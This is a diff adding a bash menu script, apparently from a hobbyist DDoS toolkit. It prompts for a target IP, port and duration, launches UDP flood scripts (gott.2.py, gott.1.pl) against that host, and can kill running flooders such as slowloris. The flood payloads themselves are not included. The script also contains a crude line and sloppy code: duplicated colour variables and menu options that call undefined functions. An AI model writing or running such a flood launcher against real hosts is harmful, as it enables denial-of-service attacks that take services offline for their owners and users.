@@ -1,0 +1,152 @@
+#!/bin/bash
+BLACK='\e[0;30m'
+CYAN='\e[0;34m'
+CYAN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+CYAN='\e[0;35m'
+RED='\e[0;33m'
+CYAN='\e[0;37m'
+CYAN='\e[1;30m'
+CYAN='\e[1;34m'
+CYAN='\e[1;32m'
+CYAN='\e[1;36m'
+CYAN='\e[1;31m'
+CYAN='\e[1;35m'
+CYAN='\e[1;33m'
+CYAN='\e[0;37m'
+CYAN='\e[1;37m'
+NC='\e[0m'              # No Color
+# Trap Signal Script
+#
+#TitaniumScript.bypass//BASH  Bypass.Function
+#load
+exit_script()
+{
+  echo "* * *Trap * * *"
+  ./m
+}
+
+dstat1()
+{
+    clear
+    echo -e " ${RED} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                          DSTAT JEAGER                             ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+dstat
+    
+}
+
+admin12()
+{
+    clear
+    echo -e " ${RED} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                          ADMIN PANEL                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+echo ":3"
+echo ""
+echo "ENTER IP ADRESS :"
+read ip
+echo "ENTER PORT (80) :"
+read port
+echo "ENTER TIME SECONDS :"
+read time
+python gott.2.py $ip $port $time
+}
+
+killall()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        KANEKI JEAGER                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              JEAGER${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${CYAN}                                ¦¦¦ "
+    echo -e "  ¦¦¦${CYAN}                            KANEKI JEAGER${CYAN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           JEAGER                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+pkill gott.1.pl
+pkill gott.2.py
+pkill gott.2.pl
+pkill gott.4.pl
+pkill slowloris
+}
+
+udp_flooda(){
+echo -en "ATTACK READY ENTER  IP ADRESS :"
+read ip
+echo -en "ENTER PORT (80) :"
+read port
+echo -en "ENTER TIME SECONDS :"
+read time
+python gott.2.py ${ip} ${port} ${time} 
+}
+
+udp_floodb(){
+echo -en "ENTER IP ADRESS:"
+read ip
+echo -en "ENTER PORT (80) :"
+read port
+echo -en "ENTER TIME SECONDS:"
+read time
+perl gott.1.pl ${ip} ${port}  ${time}
+}
+
+exit_script1()
+{
+  exit 1
+}
+
+Take_input1()
+{
+clear
+while :
+do
+clear;clear
+echo -en "${red}# CODED BY :${RED}JEAGER  ${RED}KANEKI:$    
+
+
+${RED}============================================
+${RED}*I HAVE BIG DICK*                                        
+${RED}PRESS 1 TO START AN ATTACK         
+${RED}PRESS 4 CHANGE PASSWORD         
+${RED}PRESS 6 DSTAT          
+${RED}PRESS 8 ADMIN PANEL         
+${RED}PRESS CTRL+C TO STOP ATTACK.         
+${RED}JEAGER KANEKI            
+${RED}KaNeki Jeager YT             
+${RED}============================================
+${RED}#${USERNAME}-[HELLO PRESS [1-4-6-8]:${RED}"
+    read yourch
+    case $yourch in
+      1) udp_flooda ;;
+      2) udp_floodb ;;
+	  3) killall ;;
+	  4) passwd ;;
+	  5) multi ;;
+	  6) dstat1 ;;
+	  7) and ;;
+	  8) admin12 ;;
+	  AI) autoinstall ;;
+      ex) echo "As you Command" ;  exit 1  ;;
+	  9) pkill menu  ;;
+      *) echo "INVALID SELECTION, PRESS [1-4-6-8]" ;
+         echo "PRESS ENTER. . ." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_inpt1
+#
+
+Take_input1
